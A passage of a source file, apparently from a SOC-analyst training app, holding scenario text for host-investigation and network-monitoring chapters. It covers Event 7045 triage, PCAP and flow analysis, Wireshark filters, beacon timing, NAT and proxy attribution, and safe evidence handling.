          defaultAnimation: 'm07-workstation-baseline-profile' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'base-operating-hours', label: 'OPERATING HOURS' },
            { id: 'base-approved-procs', label: 'APPROVED PROCS' },
            { id: 'base-service-accounts', label: 'SERVICE ACCOUNTS' },
            { id: 'base-deviation-signal', label: 'DEVIATION SIGNAL' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: EVENT 7045',
          subPillar: 'SERVICE INSTALLATION',
          heading: 'Windows System Event 7045 Service Installation',
          paragraph1:
            'Windows System Event 7045 records service installation. When a new service appears, Mentor Ravi asks: "Is that enough to call it malicious? No. Approval and executable context matter."',
          paragraph2:
            'Comparing ImagePath and change notices: Approved IT sensor updates install to Program Files with tickets; rogue backdoor services install to Temp or Public directories without tickets.',
          techBoxTitle: 'TECH BOX: Event 7045 & SCM Persistence Triangulation [Details]',
          techBoxAnalogy:
            'A new company badge issued: if the HR database shows a newly hired accountant, it is approved; if a badge was printed for an unknown contractor at 2:00 AM, it is a breach.',
          techBoxDef:
            'Event 7045 (A Service Was Installed) provides high-fidelity detection of new services registered in the Windows Service Control Manager.',
          techBoxWhy:
            'Catches lateral movement tools (PsExec) and persistence mechanisms used by ransomware operators.',
          defaultAnimation: 'm07-event-7045-service' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'svc7045-system-log', label: 'EVENT 7045' },
            { id: 'svc7045-image-path', label: 'IMAGEPATH' },
            { id: 'svc7045-change-notice', label: 'APPROVED UPDATE ✓' },
            { id: 'svc7045-rogue-backdoor', label: 'ROGUE PSEXESVC 🚨' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: TRIAGE EQUILIBRIUM',
          subPillar: 'CONTEXT-DRIVEN DECISION',
          heading: 'Context-Driven Triage Decision & Equilibrium',
          paragraph1:
            'Mentor Ravi guides: "Which one needs additional investigation? The unexplained installation, while still documenting the authorized example accurately."',
          paragraph2:
            'Context balances technical observables with business realities: avoiding both missed security concerns and unnecessary enterprise panic.',
          techBoxTitle: 'TECH BOX: Triage Equilibrium & Avoiding False Panic [Details]',
          techBoxAnalogy:
            'A smoke detector in a kitchen: knowing the difference between burnt toast (benign deviation) and an active stovetop grease fire (critical emergency).',
          techBoxDef:
            'Triage Equilibrium is the analytical state where decisions are weighted equally by technical observables and corroborated business context.',
          techBoxWhy:
            'Saves the enterprise from costly business disruption while ensuring real intrusions receive immediate containment.',
          defaultAnimation: 'm07-context-triage-decision' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ctx-unexplained-install', label: 'UNEXPLAINED INSTALL' },
            { id: 'ctx-authorized-ticket', label: 'DOCUMENTED ACTION' },
            { id: 'ctx-alarm-avoidance', label: 'EQUILIBRIUM' },
            { id: 'ctx-escalation-rule', label: 'ESCALATION RULE' },
          ],
        },
      ];
    }

    // 6. M07-U3-C2: Cross-check user and host context
    if (chId === 'M07-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TIMELINE INTEGRATION',
          subPillar: 'WORKSTATION-TO-CASE',
          heading: 'Workstation Host Timeline Evidence Integration',
          paragraph1:
            'Host records from BLR-BR-WS-04 join the Case #2026-881 master timeline: DC logons, local console events, Event 7045 service creation, and outbound network proxy flows.',
          paragraph2:
            'Mentor Ravi emphasizes: "Combine host observations with identity and service context, using only sources you are authorized to access, with verified links and gaps marked."',
          techBoxTitle: 'TECH BOX: Multi-Source Evidence Timeline Synthesis [Details]',
          techBoxAnalogy:
            'A film editor synchronizing audio tracks, actor cameras, and stunt footage into a single coherent scene.',
          techBoxDef:
            'Evidence Timeline Synthesis synchronizes host event logs, directory authentication, and network telemetry into an unbroken chronological continuum.',
          techBoxWhy:
            'Exposes the complete intrusion chain: initial credential abuse &rarr; host lateral movement &rarr; external C2 connection.',
          defaultAnimation: 'm07-host-timeline-integration' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'host-verified-links', label: 'VERIFIED ENTITIES' },
            { id: 'host-unresolved-gaps', label: 'MARKED GAPS' },
            { id: 'host-timeline-track', label: 'MULTI-TRACK' },
            { id: 'host-cross-source-sync', label: 'CROSS-SOURCE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: COMMUNICATION PLAYBOOK',
          subPillar: 'ANTI-TIPPING-OFF',
          heading: 'The SOC Communication Playbook & Anti-Tipping-Off',
          paragraph1:
            'When the apprentice asks about messaging employee Ramesh directly, Mentor Ravi warns: "Follow the communication playbook. Uncoordinated contact can confuse the investigation or tip off an adversary."',
          paragraph2:
            'If an attacker controls Ramesh\'s active session, a direct message on Teams alerts them that they are detected, triggering them to wipe logs or deploy ransomware immediately.',
          techBoxTitle: 'TECH BOX: Operational Security & Anti-Tipping-Off Protocols [Details]',
          techBoxAnalogy:
            'Detectives staking out a burglary: calling the homeowner’s landline while the burglar is inside the house alerts the intruder to escape through the back window.',
          techBoxDef:
            'Anti-Tipping-Off Protocols govern employee inquiries during active investigations to prevent alerting adversaries to SOC surveillance.',
          techBoxWhy:
            'Preserves endpoint forensic evidence and protects ongoing containment operations from adversary counter-actions.',
          defaultAnimation: 'm07-communication-playbook' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'comm-playbook-rules', label: 'PLAYBOOK RULES' },
            { id: 'comm-shift-lead-gate', label: 'SHIFT LEAD GATE' },
            { id: 'comm-anti-tipping-off', label: 'ANTI-TIPPING-OFF 🛡️' },
            { id: 'comm-verified-outreach', label: 'VERIFIED REACH' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SCOPED HOST SUMMARY',
          subPillar: 'SUPERVISORY DOSSIER',
          heading: 'Scoped Host Summary Dossier & Supervisory Seal',
          paragraph1:
            'Mentor Ravi asks: "What should you do if the host identifier disagrees with the alert\'s label? Flag the mismatch and verify it before merging the evidence."',
          paragraph2:
            'The apprentice delivers a scoped host summary, excluding unrelated database server noise. Mentor Ravi and Shift Lead Ananya sign off on Case #2026-881 host investigation.',
          techBoxTitle: 'TECH BOX: Scoped Host Dossiers & Supervisory Sign-Off [Details]',
          techBoxAnalogy:
            'A completed forensic audit report stamped with official seal and certified signature, ready for senior trial presentation.',
          techBoxDef:
            'A Scoped Host Dossier bundles verified host identity anchors, service artifacts, timeline links, and explicit boundary qualifications.',
          techBoxWhy:
            'Strengthens the case file by validating identities and bounding scope, preparing the team for Network Security Monitoring in Module 08.',
          defaultAnimation: 'm07-scoped-host-summary' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'summ-host-id-check', label: 'HOST ID CHECK' },
            { id: 'summ-scoped-boundaries', label: 'SCOPED DOSSIER' },
            { id: 'summ-unrelated-excluded', label: 'NOISE EXCLUDED' },
            { id: 'summ-ravi-signoff', label: 'SIGNED & SEALED ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 08: NETWORK SECURITY MONITORING (Mentor Meera)
    // 6 Chapters x 3 Pillars = 18 Dedicated Scenarios
    // =========================================================================

    // Chapter 1: M08-U1-C1 (Packets, flows and PCAP)
    if (chId === 'M08-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PACKETS & FLOWS',
          subPillar: 'WIRE VS SUMMARY',
          heading: 'Packets, Flows & PCAP Demarcation',
          paragraph1:
            'Mentor Meera welcomes the apprentice to the network visibility zone: "Packets are units of communication. Flows summarise conversations; a PCAP stores captured packet data."',
          paragraph2:
            'Network analysts choose their tools based on the question: use Zeek/NetFlow summaries for high-altitude session volume and duration, but reserve raw PCAP packet analysis for protocol flags and payload triage.',
          techBoxTitle: 'TECH BOX: Wire Packets, Flow Logs & PCAP Master [Details]',
          techBoxAnalogy:
            'Packets are individual recorded letters in an envelope; flows are courier delivery manifests recording sender, receiver, and weight.',
          techBoxDef:
            'A packet contains raw Layer 2-7 protocol octets; a flow aggregates 5-tuple conversations; a PCAP is a standardized binary archive preserving exact arrival times.',
          techBoxWhy:
            'Matching the right evidence source to the investigation question prevents analysts from drowning in multi-gigabyte captures.',
          defaultAnimation: 'm08-packet-flow-pcap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pcap-raw-packet', label: 'RAW PACKETS' },
            { id: 'pcap-flow-summary', label: 'ZEEK FLOWS' },
            { id: 'pcap-file-store', label: 'PCAP MASTER' },
            { id: 'pcap-meera-doctrine', label: 'MEERA RULE 💡' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: SENSOR TAP GEOMETRY',
          subPillar: 'CAPTURE FIDELITY',
          heading: 'Capture Scope & Sensor Tap Geometry',
          paragraph1:
            'The apprentice asks: "Does a capture contain everything on the entire network?" Mentor Meera replies: "No. Visibility depends on where, when, and how traffic was captured, including filters and packet loss."',
          paragraph2:
            'Hardware optical TAPs provide full-duplex zero-drop visibility across core backbones, while switch SPAN ports may drop mirrored frames during high-throughput saturation peaks.',
          techBoxTitle: 'TECH BOX: Network TAPs vs SPAN Mirroring [Details]',
          techBoxAnalogy:
            'A hardware TAP is a dedicated glass prism splitting the lightbeam effortlessly; a SPAN port is an overworked clerk copying letters on a shared photocopier.',
          techBoxDef:
            'Hardware TAPs passively replicate physical electrical/optical signals without software overhead. SPAN ports replicate switch frames subject to internal buffer queues.',
          techBoxWhy:
            'Prevents missing forensic artifacts caused by switch packet drops or incomplete physical capture boundaries.',
          defaultAnimation: 'm08-capture-scope' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'scope-network-tap', label: 'HARDWARE TAP' },
            { id: 'scope-span-mirror', label: 'SPAN PORT ⚠️' },
            { id: 'scope-host-agent', label: 'HOST AGENT' },
            { id: 'scope-boundary-qual', label: 'SCOPE BOUNDARY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SEGMENT VISIBILITY',
          subPillar: 'QUIET FALLACY TRAP',
          heading: 'Segment Visibility & The Quiet Assumption Trap',
          paragraph1:
            'Mentor Meera asks: "Can a capture from the wrong network segment prove a workstation was quiet?" The apprentice realizes: "No. It may not have seen the workstation\'s traffic."',
          paragraph2:
            'If a network sensor sits on the DMZ server link, it cannot see lateral peer-to-peer SMB traffic on the branch workstation access switch. Absence of evidence on the wrong wire is not evidence of absence.',
          techBoxTitle: 'TECH BOX: Topologic Boundaries & Scope Precedence [Details]',
          techBoxAnalogy:
            'Checking a highway tollbooth camera cannot prove a car never moved between two houses on a quiet suburban cul-de-sac.',
          techBoxDef:
            'The Quiet Workstation Fallacy assumes host inactivity based on unmonitored segments. The Meera Doctrine dictates: always describe capture scope before conclusions.',
          techBoxWhy:
            'Stops analysts from falsely clearing infected endpoints whose lateral propagation never crossed the monitored perimeter trunk.',
          defaultAnimation: 'm08-segment-visibility' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'seg-monitored-zone', label: 'DMZ MONITORED' },
            { id: 'seg-blind-spot', label: 'ACCESS BLIND SPOT' },
            { id: 'seg-quiet-trap', label: 'QUIET TRAP 🚫' },
            { id: 'seg-meera-verdict', label: 'SCOPE RULE ✓' },
          ],
        },
      ];
    }

    // Chapter 2: M08-U1-C2 (DNS, HTTP(S) and connection metadata)
    if (chId === 'M08-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TLS BOUNDARY',
          subPillar: 'PLAINTEXT VS CIPHER',
          heading: 'TLS/HTTPS Encryption Boundary & Metadata',
          paragraph1:
            'Mentor Meera explains: "Visibility depends on protocols and configuration. HTTPS generally protects application content from ordinary passive inspection."',
          paragraph2:
            'Passive network sensors observe the cleartext TLS ClientHello (including SNI domain) and server certificate hierarchy, but inner HTTP request paths and payloads remain locked behind AES-GCM ciphers.',
          techBoxTitle: 'TECH BOX: TLS Handshake Telemetry & Cipher Boundaries [Details]',
          techBoxAnalogy:
            'Viewing the delivery address and stamp on a sealed envelope, but being unable to read the letter folded inside.',
          techBoxDef:
            'Server Name Indication (SNI) reveals target hostnames in cleartext during TLS handshakes. Symmetric session ciphers protect subsequent application data.',
          techBoxWhy:
            'Defines the precise boundary between verifiable wire metadata and inaccessible payload content.',
          defaultAnimation: 'm08-tls-metadata-boundary' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tls-client-hello', label: 'SNI CLEARTEXT' },
            { id: 'tls-server-cert', label: 'X.509 CERTS' },
            { id: 'tls-encrypted-app', label: 'ENCRYPTED CIPHER 🔒' },
            { id: 'tls-inspection-boundary', label: 'INSPECT BOUNDARY' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DNS CORRELATION',
          subPillar: 'NAME RESOLUTION',
          heading: 'DNS Query Telemetry & Resolution Flow',
          paragraph1:
            'Workstation BLR-BR-WS-04 initiates UDP port 53 queries to internal resolver BLR-DNS-01 before establishing TCP sessions, creating an essential early-warning telemetry trail.',
          paragraph2:
            'Correlating DNS query transaction IDs with subsequent TCP port 443 handshakes proves intentional host resolution and separates domain-driven requests from hardcoded C2 IP beacons.',
          techBoxTitle: 'TECH BOX: DNS Query-to-Socket Handshake Correlation [Details]',
          techBoxAnalogy:
            'Looking up a company in the yellow pages directory right before dialing their telephone number.',
          techBoxDef:
            'DNS telemetry maps domain name inquiries to resolved IPv4/IPv6 addresses and TTL expiration windows, providing internal host attribution.',
          techBoxWhy:
            'Detects early-stage threat actor infrastructure staging, DGA domains, and abnormal DNS tunneling attempts.',
          defaultAnimation: 'm08-dns-telemetry-correlation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dns-query-packet', label: 'UDP 53 QUERY' },
            { id: 'dns-resolver-relay', label: 'BLR-DNS-01' },
            { id: 'dns-response-record', label: 'A-RECORD ANSWER' },
            { id: 'dns-lateral-visibility', label: 'SOCKET CORRELATION' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: PAYLOAD RESTRAINT',
          subPillar: 'METADATA FACT',
          heading: 'Payload Assumption vs Metadata Proof',
          paragraph1:
            'Mentor Meera asks: "Does observing a connection to an address prove which document was downloaded?" The apprentice confirms: "No. I need evidence that actually contains or supports that detail."',
          paragraph2:
            'Meera establishes the cardinal SOC rule: "Do not write a payload story from metadata alone." When the wire is encrypted, cross the bridge to host endpoint EDR to verify file artifacts.',
          techBoxTitle: 'TECH BOX: Forensic Restraint & Host Corroboration [Details]',
          techBoxAnalogy:
            'Seeing someone enter a library and leave with a bag does not prove they borrowed a specific confidential book.',
          techBoxDef:
            'Connection metadata proves transport parameters (IPs, ports, volume, duration). File identity requires payload inspection or host file-creation telemetry (Sysmon Event 11).',
          techBoxWhy:
            'Prevents misleading senior incident responders with unsubstantiated theories about file theft or data leaks.',
          defaultAnimation: 'm08-payload-assumption-trap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'trap-metadata-fact', label: 'METADATA FACT ✓' },
            { id: 'trap-unsupported-story', label: 'ROOKIE GUESS 🚫' },
            { id: 'trap-corroboration-bridge', label: 'HOST EDR BRIDGE' },
            { id: 'trap-meera-rule', label: 'MEERA RULE 💡' },
          ],
        },
      ];
    }

    // Chapter 3: M08-U2-C1 (Filters and conversations)
    if (chId === 'M08-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: WIRESHARK ARCHITECTURE',
          subPillar: 'TRI-PANE INSPECTION',
          heading: 'Wireshark Tri-Pane Architecture & Inspection',
          paragraph1:
            'Mentor Meera guides the apprentice through Wireshark\'s tri-pane interface: Packet List (flight radar), Packet Details (OSI decoder tree), and Packet Bytes (raw hexadecimal dump).',
          paragraph2:
            'Each pane provides a different vantage point on the same wire frame. Analysts filter from the list, inspect protocol headers in the details tree, and verify raw octets in the hex dump.',
          techBoxTitle: 'TECH BOX: The Wireshark Tri-Pane Dissector Engine [Details]',
          techBoxAnalogy:
            'A medical scan showing an anatomical overview, an isolated organ cross-section, and microscopic cellular tissue simultaneously.',
          techBoxDef:
            'Packet List displays chronological flow summaries; Packet Details decodes Layer 2-7 RFC headers; Packet Bytes displays synchronized hexadecimal and ASCII representations.',
          techBoxWhy:
            'Gives the apprentice the exact mental model needed to navigate complex packet captures without getting lost.',
          defaultAnimation: 'm08-wireshark-anatomy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ws-packet-list', label: 'PACKET LIST' },
            { id: 'ws-packet-details', label: 'DETAILS TREE' },
            { id: 'ws-packet-bytes', label: 'HEX BYTES' },
            { id: 'ws-meera-guide', label: 'TRI-PANE HARMONY' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: FILTER MECHANICS',
          subPillar: 'BPF VS DISPLAY',
          heading: 'Display Filter vs Capture Filter Mechanics',
          paragraph1:
            'The apprentice asks: "Will applying a display filter delete the hidden packets?" Mentor Meera reassures: "No. A display filter changes the view, not the underlying capture."',
          paragraph2:
            'BPF capture filters run at the kernel driver layer to discard non-matching packets before disk write, whereas Wireshark display filters act as non-destructive optical lenses on recorded PCAP files.',
          techBoxTitle: 'TECH BOX: BPF Pre-Disk Filtering vs Wireshark Display Filters [Details]',
          techBoxAnalogy:
            'A capture filter is a sieve at the inlet pipe that rejects sand; a display filter is sunglasses that make specific colors stand out while all objects remain.',
          techBoxDef:
            'BPF capture filters permanently restrict capture storage. Display filters (e.g. ip.addr == 10.0.4.21) evaluate in-memory views without altering the master PCAP file.',
          techBoxWhy:
            'Prevents analyst anxiety about data loss during iterative query tuning and displays filter syntax rules.',
          defaultAnimation: 'm08-display-vs-capture-filter' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'filt-capture-bpf', label: 'BPF PRE-DISK' },
            { id: 'filt-display-engine', label: 'DISPLAY ENGINE' },
            { id: 'filt-non-destructive', label: 'NON-DESTRUCTIVE' },
            { id: 'filt-storage-efficiency', label: 'FILTER STRATEGY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FILTER REPRODUCIBILITY',
          subPillar: 'CITATIONS & NOTES',
          heading: 'Reproducible Filter Notation & Packet Indexing',
          paragraph1:
            'Mentor Meera asks: "Should you keep the filter expression with your notes?" The apprentice answers: "Yes. It helps another analyst reproduce the view."',
          paragraph2:
            'SOC Level 1 notes must cite exact filter expressions and explicit packet frame numbers (e.g. Frames #104–#112). L2 responders can recreate the exact view in under 15 seconds.',
          techBoxTitle: 'TECH BOX: Case Ticket Packet Citations & Master Preservation [Details]',
          techBoxAnalogy:
            'Citing the exact page, paragraph, and line number in an encyclopedia rather than saying "it is somewhere in volume 4".',
          techBoxDef:
            'Reproducible documentation records the master capture hash, the exact display filter syntax, and sequential packet index references.',
          techBoxWhy:
            'Ensures seamless shift handover and audit-proof evidence verification during high-priority security incidents.',
          defaultAnimation: 'm08-filter-reproducibility' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rep-filter-syntax', label: 'FILTER SYNTAX' },
            { id: 'rep-packet-index', label: 'PACKET REFS #104' },
            { id: 'rep-peer-verification', label: 'PEER HANDOFF' },
            { id: 'rep-evidence-integrity', label: 'MASTER PRESERVED ✓' },
          ],
        },
      ];
    }

    // Chapter 4: M08-U2-C2 (Repeated attempts and scan-like patterns)
    if (chId === 'M08-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SCAN RECONNAISSANCE',
          subPillar: 'PORT PROBING',
          heading: 'Port Scanning & Sweep Reconnaissance',
          paragraph1:
            'Mentor Meera points to the packet stream: "One host contacts several ports; another sends regular connections to a single destination."',
          paragraph2:
            'Rapid sequential TCP SYN packets across multiple destination ports indicate port enumeration. However, analysts must verify change tickets: internal host BLR-VULN-SCAN01 runs approved scheduled scans.',
          techBoxTitle: 'TECH BOX: Port Sweeps, RST-ACK Responses & Change Windows [Details]',
          techBoxAnalogy:
            'A night security guard testing doorknobs on a hallway to see which offices are locked.',
          techBoxDef:
            'SYN port scans send connection initiation requests across port ranges to identify listening services based on SYN-ACK (open) or RST-ACK (closed) responses.',
          techBoxWhy:
            'Separates routine automated vulnerability scanning from unauthorized external reconnaissance.',
          defaultAnimation: 'm08-port-scan-recon' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'scan-syn-sequence', label: 'SYN SWEEP' },
            { id: 'scan-rst-responses', label: 'RST-ACK CLOSED' },
            { id: 'scan-authorized-tools', label: 'APPROVED SCANNER' },
            { id: 'scan-meera-context', label: 'RECON CONTEXT' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: BEACON TIMING',
          subPillar: 'DELTA-T CADENCE',
          heading: 'Periodic Beacon & Timing Interval Analysis',
          paragraph1:
            'The apprentice asks: "Do equal time intervals prove command-and-control beaconing?" Mentor Meera explains: "No. Scheduled checks and monitoring agents can also be periodic."',
          paragraph2:
            'Plotting connection arrival deltas on a scatter chart reveals mathematical rhythms: rigid 60s intervals indicate scripts, jittered cadences indicate evasive C2, while NTP and SIEM forwarders pulse legitimately.',
          techBoxTitle: 'TECH BOX: Delta-T Timing Variance & Automated Cadence [Details]',
          techBoxAnalogy:
            'A clock ticking steadily every second versus a person casually knocking on a door at random moments.',
          techBoxDef:
            'Delta-T measures the exact time delta between successive outbound connection attempts to distinguish programmatic automated calls from human web navigation.',
          techBoxWhy:
            'Identifies automated malware check-in loops while accounting for legitimate enterprise scheduled jobs.',
          defaultAnimation: 'm08-periodic-beacon-analysis' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'beac-regular-delta', label: 'FIXED 60s DELTA' },
            { id: 'beac-jittered-cadence', label: 'JITTER 60s ± 20%' },
            { id: 'beac-legitimate-services', label: 'NTP / SIEM PULSE' },
            { id: 'beac-delta-analysis', label: 'DELTA-T ANALYSIS' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: INTENT RESTRAINT',
          subPillar: 'EVIDENCE DISCIPLINE',
          heading: 'Timing Attribution vs Intent Restraint',
          paragraph1:
            'Mentor Meera poses the core dilemma: "Which is stronger: \'beaconing proven\' or \'periodic connections observed; purpose unverified\'?"',
          paragraph2:
            'The apprentice chooses the second. Meera approves: "Exactly. A cautious description is more useful than a dramatic unsupported label. The finance case builds on truth."',
          techBoxTitle: 'TECH BOX: Professional Phrasing & Attribution Restraint [Details]',
          techBoxAnalogy:
            'A detective stating "the suspect was seen outside the bank at 2 PM" rather than declaring "the suspect robbed the bank at 2 PM".',
          techBoxDef:
            'Intent restraint dictates that analysts state verified physical properties (timing, ports, IP reputation) without speculating on adversary motivation without corroboration.',
          techBoxWhy:
            'Protects SOC operational credibility and prevents emergency escalations triggered by unsupported guesswork.',
          defaultAnimation: 'm08-timing-attribution-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'doc-unsupported-label', label: 'DRAMATIC CLAIM 🚫' },
            { id: 'doc-factual-restraint', label: 'DISCIPLINED NOTE ✓' },
            { id: 'doc-destination-triage', label: 'DESTINATION TRIAGE' },
            { id: 'doc-meera-verdict', label: 'RESTRAINT DOCTRINE' },
          ],
        },
      ];
    }

    // Chapter 5: M08-U3-C1 (Source/destination context)
    if (chId === 'M08-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: NAT TRANSLATION',
          subPillar: 'VANTAGE PERSPECTIVE',
          heading: 'NAT/PAT Translation & Boundary Perspective',
          paragraph1:
            'Mentor Meera instructs: "Interpret addresses from the sensor\'s viewpoint. Translation and proxies can change the identity a record exposes."',
          paragraph2:
            'Inside sensors see the true private socket (10.0.4.21:49201), whereas perimeter sensors on the outside of firewall BLR-FW-01 see only the translated shared public socket (198.51.100.5:20412).',
          techBoxTitle: 'TECH BOX: RFC 1918 Private Addressing & PAT State Tables [Details]',
          techBoxAnalogy:
            'Calling an office from an internal desk phone displays the employee\'s direct extension, but calling an outside line shows the company\'s main receptionist number.',
          techBoxDef:
            'Port Address Translation (PAT) dynamically multiplexes multiple private IP sockets onto single external public IP sockets using dynamic state tables.',
          techBoxWhy:
            'Prevents misattributing alerts to perimeter firewall interfaces instead of the underlying client workstation.',
          defaultAnimation: 'm08-nat-pat-translation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'nat-internal-socket', label: 'INSIDE LOCAL SOCKET' },
            { id: 'nat-gateway-pat', label: 'PAT GATEWAY TABLE' },
            { id: 'nat-external-socket', label: 'OUTSIDE GLOBAL IP' },
            { id: 'nat-sensor-perspective', label: 'VANTAGE RULE 💡' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: FORWARD PROXY',
          subPillar: 'X-FORWARDED-FOR',
          heading: 'Forward Proxy & X-Forwarded-For Telemetry',
          paragraph1:
            'Corporate web traffic routes through forward proxy BLR-PROXY-01 (10.0.1.100:8080). Egress captures show the proxy IP as the source for all branch employee requests.',
          paragraph2:
            'To unmask the true client workstation, analysts correlate the egress flow with proxy access logs and inspect the X-Forwarded-For header to link 10.0.4.21 to the exact destination URL.',
          techBoxTitle: 'TECH BOX: Forward Proxy Chaining & XFF Header Injection [Details]',
          techBoxAnalogy:
            'An executive having their personal assistant place a telephone call on their behalf; the assistant\'s logbook records who ordered the call.',
          techBoxDef:
            'Forward proxies terminate client TCP connections and establish new outbound connections, logging original client IPs in access logs and X-Forwarded-For headers.',
          techBoxWhy:
            'Bridges the gap between external firewall alerts and internal user device identities.',
          defaultAnimation: 'm08-proxy-header-chain' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'prx-client-request', label: 'CLIENT-TO-PROXY' },
            { id: 'prx-forward-egress', label: 'PROXY EGRESS' },
            { id: 'prx-xff-header', label: 'X-FORWARDED-FOR' },
            { id: 'prx-log-correlation', label: 'LOG CORRELATION' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ATTRIBUTION GAPS',
          subPillar: 'TRANSPARENT CERTAINTY',
          heading: 'Attribution Resolution & Missing Translation Gaps',
          paragraph1:
            'Mentor Meera asks: "What if the translation record is missing for the relevant time?" The apprentice answers: "I should state that the device attribution is unresolved."',
          paragraph2:
            'Meera commends: "Correct. We do not manufacture certainty to make the timeline look complete." When NAT logs expire, analysts transparently document the gap and request host telemetry.',
          techBoxTitle: 'TECH BOX: DHCP Leases, Expired NAT Tables & Evidence Restraint [Details]',
          techBoxAnalogy:
            'Finding a vehicle involved in an incident with a blurry license plate where you report the make and model while acknowledging the plate digits cannot be read.',
          techBoxDef:
            'Attribution resolution requires corroboration across NAT state tables, active DHCP lease windows, and host socket records. Missing records constitute documented gaps.',
          techBoxWhy:
            'Upholds legal chain of custody and prevents falsely accusing innocent employees based on shared IP ambiguity.',
          defaultAnimation: 'm08-attribution-resolution' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'attr-resolved-match', label: 'RESOLVED MATCH ✓' },
            { id: 'attr-missing-lease', label: 'MISSING LEASE GAP ⚠️' },
            { id: 'attr-unresolved-declaration', label: 'UNRESOLVED NOTE' },
            { id: 'attr-meera-doctrine', label: 'CERTAINTY DOCTRINE' },
          ],
        },
      ];
    }

    // Chapter 6: M08-U3-C2 (Write a concise evidence summary)
    if (chId === 'M08-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: OBJECT EXTRACTION',
          subPillar: 'SAFE CARVING SOP',
          heading: 'Safe PCAP Object Handling & Carving Protocol',
          paragraph1:
            'The apprentice asks: "Should I extract every transferred object and open it?" Mentor Meera warns: "No. Follow the approved evidence-handling procedure; reconstructed files can be unsafe."',
          paragraph2:
            'Extracted objects from Wireshark (Export Objects) may contain active zero-day malware. Never execute carved binaries on your triage PC; hash with SHA-256 and detonate inside an isolated sandbox VM.',
          techBoxTitle: 'TECH BOX: TCP Stream Reassembly, Hashing & Detonation SOP [Details]',
          techBoxAnalogy:
            'A bomb squad discovering a suspicious package and moving it into a reinforced containment chamber before examining its contents.',
          techBoxDef:
            'Object carving reassembles dissected TCP byte streams into files. Safe handling mandates cryptographic hashing, password-protected ZIP quarantine, and sandbox isolation.',
          techBoxWhy:
            'Protects SOC analysis workstations from self-inflicted malware compromise during incident investigation.',
          defaultAnimation: 'm08-pcap-object-extraction' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'obj-export-feature', label: 'EXPORT OBJECTS' },
            { id: 'obj-sandbox-isolation', label: 'SANDBOX ISOLATION' },
            { id: 'obj-hash-verification', label: 'SHA-256 HASH' },
            { id: 'obj-handling-safety', label: 'CONTAINMENT SOP' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CONCISE DISTILLATION',
          subPillar: 'SIGNAL OVER NOISE',
          heading: 'Concise Evidence Distillation vs Packet Dump',
          paragraph1:
            'Mentor Meera trains: "Summarise what matters to this case. Do not bury the next analyst under every packet in the file. Isolate the defining sequence."',
          paragraph2:
            'Out of 500,000 raw frames in a multi-gigabyte capture, the apprentice distills the 4 key packets that prove the communication channel: DNS query, TCP SYN, TLS ClientHello, and FIN teardown.',
          techBoxTitle: 'TECH BOX: The 5-Field Network Evidence Summary Template [Details]',
          techBoxAnalogy:
            'Presenting an executive summary with key financial figures instead of handing the board 10,000 pages of unprocessed store receipts.',
          techBoxDef:
            'A concise network evidence summary documents 1. Evidence ID, 2. UTC Time Window, 3. Display Filter, 4. Packet Reference Citations, and 5. Explicit Limitations.',
          techBoxWhy:
            'Prevents alert fatigue, accelerates L2 response times, and produces clean audit-proof handoff tickets.',
          defaultAnimation: 'm08-concise-evidence-distillation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dist-capture-mass', label: '500K DUMP TRAP 🚫' },
            { id: 'dist-scoped-filtering', label: '4 KEY PACKETS ✓' },
            { id: 'dist-concise-narrative', label: '5-FIELD TEMPLATE' },
            { id: 'dist-handoff-clarity', label: 'REPRODUCIBLE NOTE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: NETWORK DOSSIER',
          subPillar: 'SUPERVISORY SEAL',
          heading: 'Network Evidence Dossier & Case Handoff',
          paragraph1:
